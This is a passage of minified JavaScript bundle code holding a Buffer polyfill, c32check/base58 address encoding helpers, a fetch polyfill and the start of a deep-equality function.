              for (this[t + i] = 255 & e; --i >= 0 && (o *= 256); )
                this[t + i] = (e / o) & 255;
              return t + n;
            }),
          (l.prototype.writeUint8 = l.prototype.writeUInt8 =
            function (e, t, n) {
              return (
                (e = +e),
                (t >>>= 0),
                n || U(this, e, t, 1, 255, 0),
                (this[t] = 255 & e),
                t + 1
              );
            }),
          (l.prototype.writeUint16LE = l.prototype.writeUInt16LE =
            function (e, t, n) {
              return (
                (e = +e),
                (t >>>= 0),
                n || U(this, e, t, 2, 65535, 0),
                (this[t] = 255 & e),
                (this[t + 1] = e >>> 8),
                t + 2
              );
            }),
          (l.prototype.writeUint16BE = l.prototype.writeUInt16BE =
            function (e, t, n) {
              return (
                (e = +e),
                (t >>>= 0),
                n || U(this, e, t, 2, 65535, 0),
                (this[t] = e >>> 8),
                (this[t + 1] = 255 & e),
                t + 2
              );
            }),
          (l.prototype.writeUint32LE = l.prototype.writeUInt32LE =
            function (e, t, n) {
              return (
                (e = +e),
                (t >>>= 0),
                n || U(this, e, t, 4, 4294967295, 0),
                (this[t + 3] = e >>> 24),
                (this[t + 2] = e >>> 16),
                (this[t + 1] = e >>> 8),
                (this[t] = 255 & e),
                t + 4
              );
            }),
          (l.prototype.writeUint32BE = l.prototype.writeUInt32BE =
            function (e, t, n) {
              return (
                (e = +e),
                (t >>>= 0),
                n || U(this, e, t, 4, 4294967295, 0),
                (this[t] = e >>> 24),
                (this[t + 1] = e >>> 16),
                (this[t + 2] = e >>> 8),
                (this[t + 3] = 255 & e),
                t + 4
              );
            }),
          (l.prototype.writeBigUInt64LE = X(function (e) {
            return N(
              this,
              e,
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : 0,
              BigInt(0),
              BigInt("0xffffffffffffffff")
            );
          })),
          (l.prototype.writeBigUInt64BE = X(function (e) {
            return R(
              this,
              e,
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : 0,
              BigInt(0),
              BigInt("0xffffffffffffffff")
            );
          })),
          (l.prototype.writeIntLE = function (e, t, n, r) {
            if (((e = +e), (t >>>= 0), !r)) {
              const r = Math.pow(2, 8 * n - 1);
              U(this, e, t, n, r - 1, -r);
            }
            let i = 0,
              o = 1,
              s = 0;
            for (this[t] = 255 & e; ++i < n && (o *= 256); )
              e < 0 && 0 === s && 0 !== this[t + i - 1] && (s = 1),
                (this[t + i] = (((e / o) >> 0) - s) & 255);
            return t + n;
          }),
          (l.prototype.writeIntBE = function (e, t, n, r) {
            if (((e = +e), (t >>>= 0), !r)) {
              const r = Math.pow(2, 8 * n - 1);
              U(this, e, t, n, r - 1, -r);
            }
            let i = n - 1,
              o = 1,
              s = 0;
            for (this[t + i] = 255 & e; --i >= 0 && (o *= 256); )
              e < 0 && 0 === s && 0 !== this[t + i + 1] && (s = 1),
                (this[t + i] = (((e / o) >> 0) - s) & 255);
            return t + n;
          }),
          (l.prototype.writeInt8 = function (e, t, n) {
            return (
              (e = +e),
              (t >>>= 0),
              n || U(this, e, t, 1, 127, -128),
              e < 0 && (e = 255 + e + 1),
              (this[t] = 255 & e),
              t + 1
            );
          }),
          (l.prototype.writeInt16LE = function (e, t, n) {
            return (
              (e = +e),
              (t >>>= 0),
              n || U(this, e, t, 2, 32767, -32768),
              (this[t] = 255 & e),
              (this[t + 1] = e >>> 8),
              t + 2
            );
          }),
          (l.prototype.writeInt16BE = function (e, t, n) {
            return (
              (e = +e),
              (t >>>= 0),
              n || U(this, e, t, 2, 32767, -32768),
              (this[t] = e >>> 8),
              (this[t + 1] = 255 & e),
              t + 2
            );
          }),
          (l.prototype.writeInt32LE = function (e, t, n) {
            return (
              (e = +e),
              (t >>>= 0),
              n || U(this, e, t, 4, 2147483647, -2147483648),
              (this[t] = 255 & e),
              (this[t + 1] = e >>> 8),
              (this[t + 2] = e >>> 16),
              (this[t + 3] = e >>> 24),
              t + 4
            );
          }),
          (l.prototype.writeInt32BE = function (e, t, n) {
            return (
              (e = +e),
              (t >>>= 0),
              n || U(this, e, t, 4, 2147483647, -2147483648),
              e < 0 && (e = 4294967295 + e + 1),
              (this[t] = e >>> 24),
              (this[t + 1] = e >>> 16),
              (this[t + 2] = e >>> 8),
              (this[t + 3] = 255 & e),
              t + 4
            );
          }),
          (l.prototype.writeBigInt64LE = X(function (e) {
            return N(
              this,
              e,
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : 0,
              -BigInt("0x8000000000000000"),
              BigInt("0x7fffffffffffffff")
            );
          })),
          (l.prototype.writeBigInt64BE = X(function (e) {
            return R(
              this,
              e,
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : 0,
              -BigInt("0x8000000000000000"),
              BigInt("0x7fffffffffffffff")
            );
          })),
          (l.prototype.writeFloatLE = function (e, t, n) {
            return $(this, e, t, !0, n);
          }),
          (l.prototype.writeFloatBE = function (e, t, n) {
            return $(this, e, t, !1, n);
          }),
          (l.prototype.writeDoubleLE = function (e, t, n) {
            return H(this, e, t, !0, n);
          }),
          (l.prototype.writeDoubleBE = function (e, t, n) {
            return H(this, e, t, !1, n);
          }),
          (l.prototype.copy = function (e, t, n, r) {
            if (!l.isBuffer(e))
              throw new TypeError("argument should be a Buffer");
            if (
              (n || (n = 0),
              r || 0 === r || (r = this.length),
              t >= e.length && (t = e.length),
              t || (t = 0),
              r > 0 && r < n && (r = n),
              r === n)
            )
              return 0;
            if (0 === e.length || 0 === this.length) return 0;
            if (t < 0) throw new RangeError("targetStart out of bounds");
            if (n < 0 || n >= this.length)
              throw new RangeError("Index out of range");
            if (r < 0) throw new RangeError("sourceEnd out of bounds");
            r > this.length && (r = this.length),
              e.length - t < r - n && (r = e.length - t + n);
            const i = r - n;
            return (
              this === e &&
              "function" === typeof Uint8Array.prototype.copyWithin
                ? this.copyWithin(t, n, r)
                : Uint8Array.prototype.set.call(e, this.subarray(n, r), t),
              i
            );
          }),
          (l.prototype.fill = function (e, t, n, r) {
            if ("string" === typeof e) {
              if (
                ("string" === typeof t
                  ? ((r = t), (t = 0), (n = this.length))
                  : "string" === typeof n && ((r = n), (n = this.length)),
                void 0 !== r && "string" !== typeof r)
              )
                throw new TypeError("encoding must be a string");
              if ("string" === typeof r && !l.isEncoding(r))
                throw new TypeError("Unknown encoding: " + r);
              if (1 === e.length) {
                const t = e.charCodeAt(0);
                (("utf8" === r && t < 128) || "latin1" === r) && (e = t);
              }
            } else
              "number" === typeof e
                ? (e &= 255)
                : "boolean" === typeof e && (e = Number(e));
            if (t < 0 || this.length < t || this.length < n)
              throw new RangeError("Out of range index");
            if (n <= t) return this;
            let i;
            if (
              ((t >>>= 0),
              (n = void 0 === n ? this.length : n >>> 0),
              e || (e = 0),
              "number" === typeof e)
            )
              for (i = t; i < n; ++i) this[i] = e;
            else {
              const o = l.isBuffer(e) ? e : l.from(e, r),
                s = o.length;
              if (0 === s)
                throw new TypeError(
                  'The value "' + e + '" is invalid for argument "value"'
                );
              for (i = 0; i < n - t; ++i) this[i + t] = o[i % s];
            }
            return this;
          });
        const D = {};
        function M(e, t, n) {
          D[e] = class extends n {
            constructor() {
              super(),
                Object.defineProperty(this, "message", {
                  value: t.apply(this, arguments),
                  writable: !0,
                  configurable: !0,
                }),
                (this.name = `${this.name} [${e}]`),
                this.stack,
                delete this.name;
            }
            get code() {
              return e;
            }
            set code(e) {
              Object.defineProperty(this, "code", {
                configurable: !0,
                enumerable: !0,
                value: e,
                writable: !0,
              });
            }
            toString() {
              return `${this.name} [${e}]: ${this.message}`;
            }
          };
        }
        function F(e) {
          let t = "",
            n = e.length;
          const r = "-" === e[0] ? 1 : 0;
          for (; n >= r + 4; n -= 3) t = `_${e.slice(n - 3, n)}${t}`;
          return `${e.slice(0, n)}${t}`;
        }
        function j(e, t, n, r, i, o) {
          if (e > n || e < t) {
            const r = "bigint" === typeof t ? "n" : "";
            let i;
            throw (
              ((i =
                o > 3
                  ? 0 === t || t === BigInt(0)
                    ? `>= 0${r} and < 2${r} ** ${8 * (o + 1)}${r}`
                    : `>= -(2${r} ** ${8 * (o + 1) - 1}${r}) and < 2 ** ${
                        8 * (o + 1) - 1
                      }${r}`
                  : `>= ${t}${r} and <= ${n}${r}`),
              new D.ERR_OUT_OF_RANGE("value", i, e))
            );
          }
          !(function (e, t, n) {
            z(t, "offset"),
              (void 0 !== e[t] && void 0 !== e[t + n]) ||
                K(t, e.length - (n + 1));
          })(r, i, o);
        }
        function z(e, t) {
          if ("number" !== typeof e)
            throw new D.ERR_INVALID_ARG_TYPE(t, "number", e);
        }
        function K(e, t, n) {
          if (Math.floor(e) !== e)
            throw (
              (z(e, n), new D.ERR_OUT_OF_RANGE(n || "offset", "an integer", e))
            );
          if (t < 0) throw new D.ERR_BUFFER_OUT_OF_BOUNDS();
          throw new D.ERR_OUT_OF_RANGE(
            n || "offset",
            `>= ${n ? 1 : 0} and <= ${t}`,
            e
          );
        }
        M(
          "ERR_BUFFER_OUT_OF_BOUNDS",
          function (e) {
            return e
              ? `${e} is outside of buffer bounds`
              : "Attempt to access memory outside buffer bounds";
          },
          RangeError
        ),
          M(
            "ERR_INVALID_ARG_TYPE",
            function (e, t) {
              return `The "${e}" argument must be of type number. Received type ${typeof t}`;
            },
            TypeError
          ),
          M(
            "ERR_OUT_OF_RANGE",
            function (e, t, n) {
              let r = `The value of "${e}" is out of range.`,
                i = n;
              return (
                Number.isInteger(n) && Math.abs(n) > 2 ** 32
                  ? (i = F(String(n)))
                  : "bigint" === typeof n &&
                    ((i = String(n)),
                    (n > BigInt(2) ** BigInt(32) ||
                      n < -(BigInt(2) ** BigInt(32))) &&
                      (i = F(i)),
                    (i += "n")),
                (r += ` It must be ${t}. Received ${i}`),
                r
              );
            },
            RangeError
          );
        const W = /[^+/0-9A-Za-z-_]/g;
        function V(e, t) {
          let n;
          t = t || 1 / 0;
          const r = e.length;
          let i = null;
          const o = [];
          for (let s = 0; s < r; ++s) {
            if (((n = e.charCodeAt(s)), n > 55295 && n < 57344)) {
              if (!i) {
                if (n > 56319) {
                  (t -= 3) > -1 && o.push(239, 191, 189);
                  continue;
                }
                if (s + 1 === r) {
                  (t -= 3) > -1 && o.push(239, 191, 189);
                  continue;
                }
                i = n;
                continue;
              }
              if (n < 56320) {
                (t -= 3) > -1 && o.push(239, 191, 189), (i = n);
                continue;
              }
              n = 65536 + (((i - 55296) << 10) | (n - 56320));
            } else i && (t -= 3) > -1 && o.push(239, 191, 189);
            if (((i = null), n < 128)) {
              if ((t -= 1) < 0) break;
              o.push(n);
            } else if (n < 2048) {
              if ((t -= 2) < 0) break;
              o.push((n >> 6) | 192, (63 & n) | 128);
            } else if (n < 65536) {
              if ((t -= 3) < 0) break;
              o.push((n >> 12) | 224, ((n >> 6) & 63) | 128, (63 & n) | 128);
            } else {
              if (!(n < 1114112)) throw new Error("Invalid code point");
              if ((t -= 4) < 0) break;
              o.push(
                (n >> 18) | 240,
                ((n >> 12) & 63) | 128,
                ((n >> 6) & 63) | 128,
                (63 & n) | 128
              );
            }
          }
          return o;
        }
        function q(e) {
          return r.toByteArray(
            (function (e) {
              if ((e = (e = e.split("=")[0]).trim().replace(W, "")).length < 2)
                return "";
              for (; e.length % 4 !== 0; ) e += "=";
              return e;
            })(e)
          );
        }
        function G(e, t, n, r) {
          let i;
          for (i = 0; i < r && !(i + n >= t.length || i >= e.length); ++i)
            t[i + n] = e[i];
          return i;
        }
        function Y(e, t) {
          return (
            e instanceof t ||
            (null != e &&
              null != e.constructor &&
              null != e.constructor.name &&
              e.constructor.name === t.name)
          );
        }
        function Z(e) {
          return e !== e;
        }
        const J = (function () {
          const e = "0123456789abcdef",
            t = new Array(256);
          for (let n = 0; n < 16; ++n) {
            const r = 16 * n;
            for (let i = 0; i < 16; ++i) t[r + i] = e[n] + e[i];
          }
          return t;
        })();
        function X(e) {
          return "undefined" === typeof BigInt ? Q : e;
        }
        function Q() {
          throw new Error("BigInt not supported");
        }
      },
      8357: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.c32ToB58 =
            t.b58ToC32 =
            t.c32addressDecode =
            t.c32address =
            t.versions =
              void 0);
        const r = n(1942),
          i = n(5722),
          o = n(4361);
        t.versions = {
          mainnet: { p2pkh: 22, p2sh: 20 },
          testnet: { p2pkh: 26, p2sh: 21 },
        };
        const s = {};
        (s[0] = t.versions.mainnet.p2pkh),
          (s[5] = t.versions.mainnet.p2sh),
          (s[111] = t.versions.testnet.p2pkh),
          (s[196] = t.versions.testnet.p2sh);
        const a = {};
        function l(e, t) {
          if (!t.match(/^[0-9a-fA-F]{40}$/))
            throw new Error("Invalid argument: not a hash160 hex string");
          return `S${(0, r.c32checkEncode)(e, t)}`;
        }
        function c(e) {
          if (e.length <= 5)
            throw new Error("Invalid c32 address: invalid length");
          if ("S" != e[0])
            throw new Error('Invalid c32 address: must start with "S"');
          return (0, r.c32checkDecode)(e.slice(1));
        }
        (a[t.versions.mainnet.p2pkh] = 0),
          (a[t.versions.mainnet.p2sh] = 5),
          (a[t.versions.testnet.p2pkh] = 111),
          (a[t.versions.testnet.p2sh] = 196),
          (t.c32address = l),
          (t.c32addressDecode = c),
          (t.b58ToC32 = function (e) {
            let t =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : -1;
            const n = i.decode(e),
              r = (0, o.bytesToHex)(n.data),
              a = parseInt((0, o.bytesToHex)(n.prefix), 16);
            let c;
            return (
              t < 0 ? ((c = a), void 0 !== s[a] && (c = s[a])) : (c = t),
              l(c, r)
            );
          }),
          (t.c32ToB58 = function (e) {
            let t =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : -1;
            const n = c(e),
              r = n[0],
              o = n[1];
            let s;
            t < 0 ? ((s = r), void 0 !== a[r] && (s = a[r])) : (s = t);
            let l = s.toString(16);
            return 1 === l.length && (l = `0${l}`), i.encode(o, l);
          });
      },
      5722: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.decode = t.encode = void 0);
        const r = n(4304),
          i = n(4361),
          o = n(2307),
          s = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        (t.encode = function (e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : "00";
          const n = "string" === typeof e ? (0, i.hexToBytes)(e) : e,
            a = "string" === typeof t ? (0, i.hexToBytes)(t) : e;
          if (!(n instanceof Uint8Array) || !(a instanceof Uint8Array))
            throw new TypeError(
              "Argument must be of type Uint8Array or string"
            );
          const l = (0, r.sha256)((0, r.sha256)(new Uint8Array([...a, ...n])));
          return o(s).encode([...a, ...n, ...l.slice(0, 4)]);
        }),
          (t.decode = function (e) {
            const t = o(s).decode(e),
              n = t.slice(0, 1),
              i = t.slice(1, -4),
              a = (0, r.sha256)((0, r.sha256)(new Uint8Array([...n, ...i])));
            return (
              t.slice(-4).forEach((e, t) => {
                if (e !== a[t]) throw new Error("Invalid checksum");
              }),
              { prefix: n, data: i }
            );
          });
      },
      1942: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.c32checkDecode = t.c32checkEncode = void 0);
        const r = n(4304),
          i = n(4361),
          o = n(4082);
        function s(e) {
          const t = (0, r.sha256)((0, r.sha256)((0, i.hexToBytes)(e)));
          return (0, i.bytesToHex)(t.slice(0, 4));
        }
        (t.c32checkEncode = function (e, t) {
          if (e < 0 || e >= 32)
            throw new Error("Invalid version (must be between 0 and 31)");
          if (!t.match(/^[0-9a-fA-F]*$/))
            throw new Error("Invalid data (not a hex string)");
          (t = t.toLowerCase()).length % 2 !== 0 && (t = `0${t}`);
          let n = e.toString(16);
          1 === n.length && (n = `0${n}`);
          const r = s(`${n}${t}`),
            i = (0, o.c32encode)(`${t}${r}`);
          return `${o.c32[e]}${i}`;
        }),
          (t.c32checkDecode = function (e) {
            e = (0, o.c32normalize)(e);
            const t = (0, o.c32decode)(e.slice(1)),
              n = e[0],
              r = o.c32.indexOf(n),
              i = t.slice(-8);
            let a = r.toString(16);
            if (
              (1 === a.length && (a = `0${a}`),
              s(`${a}${t.substring(0, t.length - 8)}`) !== i)
            )
              throw new Error("Invalid c32check string: checksum mismatch");
            return [r, t.substring(0, t.length - 8)];
          });
      },
      4082: (e, t, n) => {
        "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.c32decode = t.c32normalize = t.c32encode = t.c32 = void 0);
        const r = n(4361);
        t.c32 = "0123456789ABCDEFGHJKMNPQRSTVWXYZ";
        const i = "0123456789abcdef";
        function o(e) {
          return e.toUpperCase().replace(/O/g, "0").replace(/L|I/g, "1");
        }
        (t.c32encode = function (e, n) {
          if (!e.match(/^[0-9a-fA-F]*$/))
            throw new Error("Not a hex-encoded string");
          e.length % 2 !== 0 && (e = `0${e}`);
          let o = [],
            s = 0;
          for (let r = (e = e.toLowerCase()).length - 1; r >= 0; r--)
            if (s < 4) {
              const n = i.indexOf(e[r]) >> s;
              let a = 0;
              0 !== r && (a = i.indexOf(e[r - 1]));
              const l = 1 + s,
                c = a % (1 << l) << (5 - l),
                u = t.c32[n + c];
              (s = l), o.unshift(u);
            } else s = 0;
          let a = 0;
          for (let t = 0; t < o.length && "0" === o[t]; t++) a++;
          o = o.slice(a);
          const l = new TextDecoder()
              .decode((0, r.hexToBytes)(e))
              .match(/^\u0000*/),
            c = l ? l[0].length : 0;
          for (let r = 0; r < c; r++) o.unshift(t.c32[0]);
          if (n) {
            const e = n - o.length;
            for (let n = 0; n < e; n++) o.unshift(t.c32[0]);
          }
          return o.join("");
        }),
          (t.c32normalize = o),
          (t.c32decode = function (e, n) {
            if (!(e = o(e)).match(`^[${t.c32}]*$`))
              throw new Error("Not a c32-encoded string");
            const r = e.match(`^${t.c32[0]}*`),
              s = r ? r[0].length : 0;
            let a = [],
              l = 0,
              c = 0;
            for (let o = e.length - 1; o >= 0; o--) {
              4 === c && (a.unshift(i[l]), (c = 0), (l = 0));
              const n = (t.c32.indexOf(e[o]) << c) + l,
                r = i[n % 16];
              if (((c += 1), (l = n >> 4), l > 1 << c))
                throw new Error("Panic error in decoding.");
              a.unshift(r);
            }
            a.unshift(i[l]), a.length % 2 === 1 && a.unshift("0");
            let u = 0;
            for (let t = 0; t < a.length && "0" === a[t]; t++) u++;
            a = a.slice(u - (u % 2));
            let f = a.join("");
            for (let t = 0; t < s; t++) f = `00${f}`;
            if (n) {
              const e = 2 * n - f.length;
              for (let t = 0; t < e; t += 2) f = `00${f}`;
            }
            return f;
          });
      },
      5398: (e, t, n) => {
        "use strict";
        t.yI = t.H4 = void 0;
        const r = n(4082);
        const i = n(1942);
        const o = n(8357);
        Object.defineProperty(t, "H4", {
          enumerable: !0,
          get: function () {
            return o.c32address;
          },
        }),
          Object.defineProperty(t, "yI", {
            enumerable: !0,
            get: function () {
              return o.c32addressDecode;
            },
          });
      },
      8916: function () {
        !(function (e) {
          !(function (t) {
            var n = "URLSearchParams" in e,
              r = "Symbol" in e && "iterator" in Symbol,
              i =
                "FileReader" in e &&
                "Blob" in e &&
                (function () {
                  try {
                    return new Blob(), !0;
                  } catch (e) {
                    return !1;
                  }
                })(),
              o = "FormData" in e,
              s = "ArrayBuffer" in e;
            if (s)
              var a = [
                  "[object Int8Array]",
                  "[object Uint8Array]",
                  "[object Uint8ClampedArray]",
                  "[object Int16Array]",
                  "[object Uint16Array]",
                  "[object Int32Array]",
                  "[object Uint32Array]",
                  "[object Float32Array]",
                  "[object Float64Array]",
                ],
                l =
                  ArrayBuffer.isView ||
                  function (e) {
                    return (
                      e && a.indexOf(Object.prototype.toString.call(e)) > -1
                    );
                  };
            function c(e) {
              if (
                ("string" !== typeof e && (e = String(e)),
                /[^a-z0-9\-#$%&'*+.^_`|~]/i.test(e))
              )
                throw new TypeError("Invalid character in header field name");
              return e.toLowerCase();
            }
            function u(e) {
              return "string" !== typeof e && (e = String(e)), e;
            }
            function f(e) {
              var t = {
                next: function () {
                  var t = e.shift();
                  return { done: void 0 === t, value: t };
                },
              };
              return (
                r &&
                  (t[Symbol.iterator] = function () {
                    return t;
                  }),
                t
              );
            }
            function h(e) {
              (this.map = {}),
                e instanceof h
                  ? e.forEach(function (e, t) {
                      this.append(t, e);
                    }, this)
                  : Array.isArray(e)
                  ? e.forEach(function (e) {
                      this.append(e[0], e[1]);
                    }, this)
                  : e &&
                    Object.getOwnPropertyNames(e).forEach(function (t) {
                      this.append(t, e[t]);
                    }, this);
            }
            function d(e) {
              if (e.bodyUsed)
                return Promise.reject(new TypeError("Already read"));
              e.bodyUsed = !0;
            }
            function p(e) {
              return new Promise(function (t, n) {
                (e.onload = function () {
                  t(e.result);
                }),
                  (e.onerror = function () {
                    n(e.error);
                  });
              });
            }
            function g(e) {
              var t = new FileReader(),
                n = p(t);
              return t.readAsArrayBuffer(e), n;
            }
            function y(e) {
              if (e.slice) return e.slice(0);
              var t = new Uint8Array(e.byteLength);
              return t.set(new Uint8Array(e)), t.buffer;
            }
            function w() {
              return (
                (this.bodyUsed = !1),
                (this._initBody = function (e) {
                  var t;
                  (this._bodyInit = e),
                    e
                      ? "string" === typeof e
                        ? (this._bodyText = e)
                        : i && Blob.prototype.isPrototypeOf(e)
                        ? (this._bodyBlob = e)
                        : o && FormData.prototype.isPrototypeOf(e)
                        ? (this._bodyFormData = e)
                        : n && URLSearchParams.prototype.isPrototypeOf(e)
                        ? (this._bodyText = e.toString())
                        : s &&
                          i &&
                          (t = e) &&
                          DataView.prototype.isPrototypeOf(t)
                        ? ((this._bodyArrayBuffer = y(e.buffer)),
                          (this._bodyInit = new Blob([this._bodyArrayBuffer])))
                        : s && (ArrayBuffer.prototype.isPrototypeOf(e) || l(e))
                        ? (this._bodyArrayBuffer = y(e))
                        : (this._bodyText = e =
                            Object.prototype.toString.call(e))
                      : (this._bodyText = ""),
                    this.headers.get("content-type") ||
                      ("string" === typeof e
                        ? this.headers.set(
                            "content-type",
                            "text/plain;charset=UTF-8"
                          )
                        : this._bodyBlob && this._bodyBlob.type
                        ? this.headers.set("content-type", this._bodyBlob.type)
                        : n &&
                          URLSearchParams.prototype.isPrototypeOf(e) &&
                          this.headers.set(
                            "content-type",
                            "application/x-www-form-urlencoded;charset=UTF-8"
                          ));
                }),
                i &&
                  ((this.blob = function () {
                    var e = d(this);
                    if (e) return e;
                    if (this._bodyBlob) return Promise.resolve(this._bodyBlob);
                    if (this._bodyArrayBuffer)
                      return Promise.resolve(new Blob([this._bodyArrayBuffer]));
                    if (this._bodyFormData)
                      throw new Error("could not read FormData body as blob");
                    return Promise.resolve(new Blob([this._bodyText]));
                  }),
                  (this.arrayBuffer = function () {
                    return this._bodyArrayBuffer
                      ? d(this) || Promise.resolve(this._bodyArrayBuffer)
                      : this.blob().then(g);
                  })),
                (this.text = function () {
                  var e = d(this);
                  if (e) return e;
                  if (this._bodyBlob)
                    return (function (e) {
                      var t = new FileReader(),
                        n = p(t);
                      return t.readAsText(e), n;
                    })(this._bodyBlob);
                  if (this._bodyArrayBuffer)
                    return Promise.resolve(
                      (function (e) {
                        for (
                          var t = new Uint8Array(e),
                            n = new Array(t.length),
                            r = 0;
                          r < t.length;
                          r++
                        )
                          n[r] = String.fromCharCode(t[r]);
                        return n.join("");
                      })(this._bodyArrayBuffer)
                    );
                  if (this._bodyFormData)
                    throw new Error("could not read FormData body as text");
                  return Promise.resolve(this._bodyText);
                }),
                o &&
                  (this.formData = function () {
                    return this.text().then(v);
                  }),
                (this.json = function () {
                  return this.text().then(JSON.parse);
                }),
                this
              );
            }
            (h.prototype.append = function (e, t) {
              (e = c(e)), (t = u(t));
              var n = this.map[e];
              this.map[e] = n ? n + ", " + t : t;
            }),
              (h.prototype.delete = function (e) {
                delete this.map[c(e)];
              }),
              (h.prototype.get = function (e) {
                return (e = c(e)), this.has(e) ? this.map[e] : null;
              }),
              (h.prototype.has = function (e) {
                return this.map.hasOwnProperty(c(e));
              }),
              (h.prototype.set = function (e, t) {
                this.map[c(e)] = u(t);
              }),
              (h.prototype.forEach = function (e, t) {
                for (var n in this.map)
                  this.map.hasOwnProperty(n) && e.call(t, this.map[n], n, this);
              }),
              (h.prototype.keys = function () {
                var e = [];
                return (
                  this.forEach(function (t, n) {
                    e.push(n);
                  }),
                  f(e)
                );
              }),
              (h.prototype.values = function () {
                var e = [];
                return (
                  this.forEach(function (t) {
                    e.push(t);
                  }),
                  f(e)
                );
              }),
              (h.prototype.entries = function () {
                var e = [];
                return (
                  this.forEach(function (t, n) {
                    e.push([n, t]);
                  }),
                  f(e)
                );
              }),
              r && (h.prototype[Symbol.iterator] = h.prototype.entries);
            var m = ["DELETE", "GET", "HEAD", "OPTIONS", "POST", "PUT"];
            function b(e, t) {
              var n = (t = t || {}).body;
              if (e instanceof b) {
                if (e.bodyUsed) throw new TypeError("Already read");
                (this.url = e.url),
                  (this.credentials = e.credentials),
                  t.headers || (this.headers = new h(e.headers)),
                  (this.method = e.method),
                  (this.mode = e.mode),
                  (this.signal = e.signal),
                  n ||
                    null == e._bodyInit ||
                    ((n = e._bodyInit), (e.bodyUsed = !0));
              } else this.url = String(e);
              if (
                ((this.credentials =
                  t.credentials || this.credentials || "same-origin"),
                (!t.headers && this.headers) ||
                  (this.headers = new h(t.headers)),
                (this.method = (function (e) {
                  var t = e.toUpperCase();
                  return m.indexOf(t) > -1 ? t : e;
                })(t.method || this.method || "GET")),
                (this.mode = t.mode || this.mode || null),
                (this.signal = t.signal || this.signal),
                (this.referrer = null),
                ("GET" === this.method || "HEAD" === this.method) && n)
              )
                throw new TypeError(
                  "Body not allowed for GET or HEAD requests"
                );
              this._initBody(n);
            }
            function v(e) {
              var t = new FormData();
              return (
                e
                  .trim()
                  .split("&")
                  .forEach(function (e) {
                    if (e) {
                      var n = e.split("="),
                        r = n.shift().replace(/\+/g, " "),
                        i = n.join("=").replace(/\+/g, " ");
                      t.append(decodeURIComponent(r), decodeURIComponent(i));
                    }
                  }),
                t
              );
            }
            function E(e) {
              var t = new h();
              return (
                e
                  .replace(/\r?\n[\t ]+/g, " ")
                  .split(/\r?\n/)
                  .forEach(function (e) {
                    var n = e.split(":"),
                      r = n.shift().trim();
                    if (r) {
                      var i = n.join(":").trim();
                      t.append(r, i);
                    }
                  }),
                t
              );
            }
            function S(e, t) {
              t || (t = {}),
                (this.type = "default"),
                (this.status = void 0 === t.status ? 200 : t.status),
                (this.ok = this.status >= 200 && this.status < 300),
                (this.statusText = "statusText" in t ? t.statusText : "OK"),
                (this.headers = new h(t.headers)),
                (this.url = t.url || ""),
                this._initBody(e);
            }
            (b.prototype.clone = function () {
              return new b(this, { body: this._bodyInit });
            }),
              w.call(b.prototype),
              w.call(S.prototype),
              (S.prototype.clone = function () {
                return new S(this._bodyInit, {
                  status: this.status,
                  statusText: this.statusText,
                  headers: new h(this.headers),
                  url: this.url,
                });
              }),
              (S.error = function () {
                var e = new S(null, { status: 0, statusText: "" });
                return (e.type = "error"), e;
              });
            var x = [301, 302, 303, 307, 308];
            (S.redirect = function (e, t) {
              if (-1 === x.indexOf(t))
                throw new RangeError("Invalid status code");
              return new S(null, { status: t, headers: { location: e } });
            }),
              (t.DOMException = e.DOMException);
            try {
              new t.DOMException();
            } catch (k) {
              (t.DOMException = function (e, t) {
                (this.message = e), (this.name = t);
                var n = Error(e);
                this.stack = n.stack;
              }),
                (t.DOMException.prototype = Object.create(Error.prototype)),
                (t.DOMException.prototype.constructor = t.DOMException);
            }
            function A(e, n) {
              return new Promise(function (r, o) {
                var s = new b(e, n);
                if (s.signal && s.signal.aborted)
                  return o(new t.DOMException("Aborted", "AbortError"));
                var a = new XMLHttpRequest();
                function l() {
                  a.abort();
                }
                (a.onload = function () {
                  var e = {
                    status: a.status,
                    statusText: a.statusText,
                    headers: E(a.getAllResponseHeaders() || ""),
                  };
                  e.url =
                    "responseURL" in a
                      ? a.responseURL
                      : e.headers.get("X-Request-URL");
                  var t = "response" in a ? a.response : a.responseText;
                  r(new S(t, e));
                }),
                  (a.onerror = function () {
                    o(new TypeError("Network request failed"));
                  }),
                  (a.ontimeout = function () {
                    o(new TypeError("Network request failed"));
                  }),
                  (a.onabort = function () {
                    o(new t.DOMException("Aborted", "AbortError"));
                  }),
                  a.open(s.method, s.url, !0),
                  "include" === s.credentials
                    ? (a.withCredentials = !0)
                    : "omit" === s.credentials && (a.withCredentials = !1),
                  "responseType" in a && i && (a.responseType = "blob"),
                  s.headers.forEach(function (e, t) {
                    a.setRequestHeader(t, e);
                  }),
                  s.signal &&
                    (s.signal.addEventListener("abort", l),
                    (a.onreadystatechange = function () {
                      4 === a.readyState &&
                        s.signal.removeEventListener("abort", l);
                    })),
                  a.send(
                    "undefined" === typeof s._bodyInit ? null : s._bodyInit
                  );
              });
            }
            (A.polyfill = !0),
              e.fetch ||
                ((e.fetch = A),
                (e.Headers = h),
                (e.Request = b),
                (e.Response = S)),
              (t.Headers = h),
              (t.Request = b),
              (t.Response = S),
              (t.fetch = A),
              Object.defineProperty(t, "__esModule", { value: !0 });
          })({});
        })("undefined" !== typeof self ? self : this);
      },
      2682: (e) => {
        "use strict";
        e.exports = function e(t, n) {
          if (t === n) return !0;
          if (t && n && "object" == typeof t && "object" == typeof n) {
            if (t.constructor !== n.constructor) return !1;
            var r, i, o;
            if (Array.isArray(t)) {
              if ((r = t.length) != n.length) return !1;
              for (i = r; 0 !== i--; ) if (!e(t[i], n[i])) return !1;
              return !0;
            }
            if (t instanceof Map && n instanceof Map) {
              if (t.size !== n.size) return !1;
              for (i of t.entries()) if (!n.has(i[0])) return !1;
              for (i of t.entries()) if (!e(i[1], n.get(i[0]))) return !1;
              return !0;
            }
